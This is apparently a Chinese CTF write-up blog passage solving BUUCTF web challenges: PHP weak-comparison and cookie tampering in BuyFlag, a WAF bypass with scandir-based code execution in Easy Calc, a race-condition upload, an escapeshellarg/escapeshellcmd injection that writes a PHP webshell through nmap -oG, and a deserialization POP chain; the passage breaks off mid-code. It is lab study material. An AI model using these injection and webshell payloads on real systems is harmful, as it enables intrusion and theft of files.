      <link href="/posts/63fbbf92.html"/>
      <url>/posts/63fbbf92.html</url>
      
        <content type="html"><![CDATA[<h1 id="web-逻辑漏洞"><a href="#web-逻辑漏洞" class="headerlink" title="web-逻辑漏洞"></a>web-逻辑漏洞</h1><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>题目：我一开始是想去把xff改成学校的特定内网ip，发现根本没有用，因为你不知道ip是啥啊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Flag</span><br><span class="line"></span><br><span class="line">Flag need your 100000000 money</span><br><span class="line">attention</span><br><span class="line"></span><br><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!!</span><br><span class="line"></span><br><span class="line">Only Cuit&#x27;s students can buy the FLAG</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由题，没思路，看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password == 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>1.password弱比较</p><p>很矛盾的就是密码是要404，但是又不能是数字</p><p>这里就要用到&#x3D;&#x3D;弱比较，即如果等式两边是字符串和整数，会把字符串转化为数字再进行比较。这就好办了：password&#x3D;404a不就好了</p><p>2.科学计数法</p><p><img src="/images/image-20260101182325159.png" alt="image-20260101182325159"></p><p>你发现直接输入数字它显示太长了，用科学计数法就ok</p><p>这里还要注意的点，就是你把原本的金额填上去，它会显示你钱不够，那你多填点不就好了</p><p>3.改cookie：</p><p>构造请求中，cookie的参数是-b</p><p><img src="/images/image-20260101182556727.png" alt="image-20260101182556727"></p><p>千辛万苦改完了，但是他说你不是他的学生</p><p><img src="/images/image-20260101182624105.png" alt="image-20260101182624105"></p><p>这里抓包后看到了user&#x3D;0，就说明你不是学生嘛，那把值改成1不就真了</p><p>来，改cookie</p><p>3.构造请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &quot;http://03a3f5cd-0bd7-4be5-bb55-829058bd107b.node5.buuoj.cn:81/pay.php&quot; -d &quot;password=404a&amp;money=1e9&quot; -b &quot;user=1&quot;</span><br></pre></td></tr></table></figure><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p>知识点：</p><ol><li><p>WAF (Web Application Firewall)</p></li><li><p>var_dump()：</p></li></ol><p><strong>var_dump()</strong> 函数用于输出变量的相关信息。</p><p><strong>var_dump()</strong> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b = 3.1;</span><br><span class="line">$c = true;</span><br><span class="line">var_dump($b, $c);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出结果为：</span><br><span class="line"></span><br><span class="line">float(3.1)</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure><p><img src="/images/image-20260101194019184.png" alt="image-20260101194019184"></p><p><strong>进入正题：</strong></p><p>先随便输入，抓包得到 <code>/calc.php?num=1+1</code></p><p>再输入一些符号*&#x2F;‘’,发现都被waf过滤了，会有提示框跳出来警告</p><p>可以看看源代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;#calc&#x27;).submit(function()&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()), //输入内容会经过编码放到calc.php里去，这不刚好是我们前面得到的东西吗，那就确定在这个页面下注入了</span><br><span class="line">        type:&#x27;GET&#x27;,</span><br><span class="line">        success:function(data)&#123;</span><br><span class="line">            $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">        &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">        &lt;/div&gt;`);</span><br><span class="line">        &#125;,</span><br><span class="line">        error:function()&#123;</span><br><span class="line">            alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    return false;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>仔细思考，既然是计算器，一般都会用到eval函数，那我们就输入一些东西让php 远程代码执行（rce)，但是有些符号可能会被我们用到，可以考虑用chr()</p><p>所以直接改url就行了，但是如果你直接输入 num&#x3D;readfile(文件路径),发现被禁止了（就是我前面说的waf），所以我们要绕过waf</p><p><img src="/images/image-20260101193118587.png" alt="image-20260101193118587"></p><p>对于waf来说，你输入：? num&#x3D;…..</p><p>他看到的是<code>空格num</code>，不是num，他就只认num，所以就放过你了</p><p>那么后面正常跟参数就行了</p><p><img src="/images/image-20260101185924710.png" alt="image-20260101185924710"></p><p>这里500报错说明你已经进入后端（绕过flag了），只是php解析错误了（你语法不正确嘛）</p><p><a href="http://node5.buuoj.cn:27002/calc.php?%20num=var_dump(scandir(chr(46)">http://node5.buuoj.cn:27002/calc.php?%20num=var_dump(scandir(chr(46)</a>))</p><p><a href="http://node5.buuoj.cn:27002/calc.php?%20num=var_dump(scandir(char(46)">http://node5.buuoj.cn:27002/calc.php?%20num=var_dump(scandir(char(46)</a>))</p><p>46是. </p><p>47是&#x2F;</p><p><img src="/images/image-20260101190705612.png" alt="image-20260101190705612"></p><p><img src="/images/image-20260101190756691.png" alt="image-20260101190756691"></p><p>找到了，现在我们要</p><p>读取：</p><p>file_get_contents()</p><p>readfile()</p><p>highlight_file()</p><p>任选</p><p>这里因为没有输入路径，只是输入了文件名，所以错了</p><p><img src="/images/image-20260101191116410.png" alt="image-20260101191116410"></p><p><img src="/images/image-20260101192942012.png" alt="image-20260101192942012"></p><h2 id="15-第十五章-归真关·竞时净魔"><a href="#15-第十五章-归真关·竞时净魔" class="headerlink" title="15 第十五章 归真关·竞时净魔"></a>15 第十五章 归真关·竞时净魔</h2><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>文件上传？其实是竞争漏洞</p><p>讨厌这道题目。什么竞争？？条件竞争</p><p>1.上传php虽然失败，但我们抓包可以发送出数次</p><p>2.同时抓包打开uploads&#x2F;对应文件名，发送无数次</p><p>3.观察响应，成功上传后就ok</p><h2 id="竞态条件（Race-Condition）"><a href="#竞态条件（Race-Condition）" class="headerlink" title="竞态条件（Race Condition）"></a><strong>竞态条件（Race Condition）</strong></h2><h3 id="什么是-Race-Condition？"><a href="#什么是-Race-Condition？" class="headerlink" title="什么是 Race Condition？"></a>什么是 Race Condition？</h3><blockquote><p><strong>多个请求“同时”访问同一份资源，<br>程序假设它们是“先后执行”，<br>但现实中它们发生了“时间重叠”，<br>导致逻辑被打乱。</strong></p></blockquote><p>一句话版：</p><blockquote><p><strong>程序没加锁，你来抢时间。</strong></p></blockquote><p>A：刚把纸放下<br>B：手刚伸过来想删掉<br>我：眼睛已经看到了</p><p>👉 <strong>“文件存在但还没被删”的极短时间窗口</strong><br> 就是漏洞窗口。</p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><table><thead><tr><th>字符类型</th><th>具体字符</th><th><code>escapeshellcmd()</code>的处理方式</th><th></th></tr></thead><tbody><tr><td>shell 特殊字符</td><td>&#96;&amp; ;</td><td>$ ( ) <code> * ? &lt; &gt;</code></td><td>加 <code>\</code> 转义（比如 <code>&amp;</code>→<code>\&amp;</code>）</td></tr><tr><td>普通字符</td><td><code>&#39; &quot; / . 数字 字母</code></td><td>不转义；如果前面有<code>\</code>，直接删<code>\</code>留字符</td><td></td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 第一步：伪造客户端IP（关键铺垫）</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解释：</span></span><br><span class="line"><span class="comment">// HTTP_X_FORWARDED_FOR是请求头，可伪造（比如用Burp/PostMan改）；</span></span><br><span class="line"><span class="comment">// 这行代码的意思是：如果有这个请求头，就把客户端真实IP替换成这个头的值；</span></span><br><span class="line"><span class="comment">// 目的：后面生成沙箱目录依赖REMOTE_ADDR，我们可以通过改这个请求头控制沙箱名称。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二步：判断是否传了host参数</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment">// 没传host的话，显示当前代码源码</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 第三步：处理host参数（看似过滤，实则有坑）</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];          <span class="comment">// 获取URL里的?host=xxx参数</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$host</span>);  <span class="comment">// 把参数用单引号包裹+转义单引号（比如把&#x27;变成\&#x27;）   注意顺序！！！1</span></span><br><span class="line">    <span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);  <span class="comment">// 转义命令行特殊字符（比如&amp;;|`$()等）</span></span><br><span class="line">    <span class="comment">//总之，arg+cmd，先转义&#x27;，又拆掉转义，做了跟没做一样，不用管他</span></span><br><span class="line">    </span><br><span class="line">    举例：</span><br><span class="line">        传入  <span class="number">172.17</span>.<span class="number">0.2</span><span class="string">&#x27; -v -d a=1</span></span><br><span class="line"><span class="string">        经过escapeshellarg， 变成 &#x27;</span><span class="number">172.17</span>.<span class="number">0.2</span>\<span class="string">&#x27; -v -d a=1&#x27;</span></span><br><span class="line">        经过escapeshellacmd， 变成 <span class="string">&#x27;172.17.0.2&#x27;</span> -v -d a=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 第四步：生成并进入沙箱目录</span></span><br><span class="line"><span class="string">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;</span>REMOTE_ADDR<span class="string">&#x27;]); // 用固定字符串+IP做MD5，生成唯一目录名</span></span><br><span class="line"><span class="string">    echo &#x27;</span>you are in sandbox <span class="string">&#x27;.$sandbox; // 输出沙箱名称</span></span><br><span class="line"><span class="string">    @mkdir($sandbox); // 创建沙箱目录（@屏蔽报错，比如目录已存在）</span></span><br><span class="line"><span class="string">    chdir($sandbox);  // 进入这个沙箱目录（后续命令都在这个目录执行）</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //chdir($sandbox)的本质就是 “进入这个沙箱目录”，而 “进入” 的底层实现，就是操作系统把当前进程的「默认工作目录」改成这个目录</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    // 第五步：执行nmap命令并输出结果</span></span><br><span class="line"><span class="string">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //通过 PHP 的字符串拼接符 . ，直接贴到-F后面</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //输入：</span></span><br><span class="line"><span class="string">    //127.0.0.1&#x27;</span> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> `cat /flag`;<span class="meta">?&gt;</span> -oG test.php <span class="string">&#x27;</span></span><br><span class="line"><span class="string">    //arg:</span></span><br><span class="line"><span class="string">    //&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span>/<span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php /&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    //cmd:</span></span><br><span class="line"><span class="string">    //&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //拼接：</span></span><br><span class="line"><span class="string">    //nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //nmap 命令实际执行逻辑：</span></span><br><span class="line"><span class="string">    //1.nmap 会把&#x27;</span><span class="string">&#x27;当成空参数，忽略；</span></span><br><span class="line"><span class="string">    //2.-oG是 nmap 的合法参数，作用是 “把扫描结果输出到 test.php 文件”；</span></span><br><span class="line"><span class="string">    //3. &lt;?php echo cat /flag;?&gt; 会被 nmap 当成 “扫描目标”，最终和 nmap 的扫描日志一起写入 test.php 文件；</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // 解释：</span></span><br><span class="line"><span class="string">    // system()会执行拼接后的命令，并把结果输出到页面；</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>1.输入</p><p>payload1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><br></pre></td></tr></table></figure><p>payload2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php #</span><br></pre></td></tr></table></figure><p>2.得到沙箱</p><p><img src="/images/image-20251220205145783.png" alt="image-20251220205145783"></p><p>3.访问沙箱下面的test.php</p><p><img src="/images/image-20251220205251772.png" alt="image-20251220205251772"></p><p>知识点总结：</p><p>1.关于前后单引号</p><p>127.0.0.1’ <?php echo `cat /flag`;?> -oG test.php ‘</p><p>因为经过arg，整个host会被包裹上单引号，所以为了避免语法错误，我们需要前面少一个单引号，后面多一个单引号给他闭合掉</p><p>2.关于127.0.0.1</p><p>nmap必须要有一个扫描的目标，所以必须填写</p><p>3.<strong>nmap参数<code>-oG</code>:将命令和结果写到文件</strong></p><p>直接写入命令 cat &#x2F;flag</p><p>&#x2F;：根目录下</p><p>&#96;&#96;:php语法中，反引号把字符串变成可执行系统命令；    没有它，你的代码只是打印文字，不是执行读文件的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=&#x27; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#x27;</span><br></pre></td></tr></table></figure><p>4.<strong>R</strong>emote <strong>C</strong>ode <strong>E</strong>xecution</p><p><strong>远程代码执行（Remote Code Execution，RCE）</strong> 是一种严重的安全漏洞，允许攻击者在目标系统上执行任意代码或命令。</p><p>RCE漏洞的原理</p><p>RCE漏洞的产生通常是因为应用程序提供了执行系统命令或代码的接口，而这些接口没有对用户输入进行严格的过滤。例如，某些网络设备（如路由器、防火墙、入侵检测系统）的Web管理界面允许用户输入IP地址进行ping操作。如果没有对输入进行严格的验证，攻击者可以通过该接口注入恶意命令，从而控制后台服务器。</p><p>RCE漏洞的危害</p><ol><li><strong>执行系统命令</strong>：攻击者可以执行任意系统命令，获取系统信息或执行恶意操作。</li><li><strong>读取和写入文件</strong>：攻击者可以读取或修改服务器上的文件，获取敏感信息或篡改数据。</li><li><strong>反弹Shell</strong>：攻击者可以通过反弹Shell获取服务器的控制权，进一步进行渗透攻击。</li><li><strong>控制整个服务器</strong>：攻击者可以完全控制服务器，执行任意操作。</li></ol><h2 id="19-第十九章-revenge"><a href="#19-第十九章-revenge" class="headerlink" title="19 第十九章_revenge"></a>19 第十九章_revenge</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $id = $this-&gt;id;</span><br><span class="line">        $name-&gt;$id($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($key, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;name = $id;</span><br><span class="line">        $name-&gt;age = $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function check($age)</span><br><span class="line">    &#123;</span><br><span class="line">        $name=$this-&gt;name;</span><br><span class="line">        if($age == null)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Age can&#x27;t be empty.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if($name === &quot;system&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            var_dump($name($age));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;age = $this-&gt;age;</span><br><span class="line">        $name($this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $person = unserialize($_GET[&#x27;person&#x27;]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>禁用system，换exec</p><p>1.<code>exec</code>是 PHP 里用来<strong>执行系统命令</strong>的函数，和你之前想用到的<code>system</code>功能几乎一样</p><ol start="2"><li></li></ol><h3 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h3><p>代码有自动执行链，避开禁用的 system 改用 exec，不用读文件而是查环境变量，让 A&#x2F;B&#x2F;C 互相指向触发执行，就能拿到 flag。</p><ol><li><strong>找链条</strong>：代码里 C→B→A→C 会自动跑一遍，最后到 C 执行命令；</li><li><strong>绕限制</strong>：system 不能用就用 exec，flag 不在文件里就用 env 查环境变量；</li><li><strong>拼 Payload</strong>：让 A&#x2F;B&#x2F;C 互相指向，传 exec 和 env，跑通链条就拿到 flag。</li></ol><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>哎，抄答案吧，代审太难了，根本不理解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 1. 仅保留必要类定义（去掉冗余空行/注释，保留核心方法）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$name</span>; <span class="keyword">public</span> <span class="variable">$id</span>; <span class="keyword">public</span> <span class="variable">$age</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable language_">$this</span>-&gt;age); <span class="comment">// 核心：调用C的check方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123; <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>; &#125; <span class="comment">// 保留__set（虽未用到，但不删）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>;     <span class="comment">// 给C的name赋值</span></span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$age</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$age</span> == <span class="literal">null</span>) <span class="keyword">die</span>(<span class="string">&quot;Age can&#x27;t be empty.&quot;</span>);</span><br><span class="line">        <span class="keyword">elseif</span> (<span class="variable">$name</span> === <span class="string">&quot;system&quot;</span>) <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="title function_ invoke__">var_dump</span>(<span class="variable">$name</span>(<span class="variable">$age</span>)); <span class="comment">// 执行命令</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>); <span class="comment">// 触发B的__invoke</span></span><br><span class="line">    &#125;</span><br><span 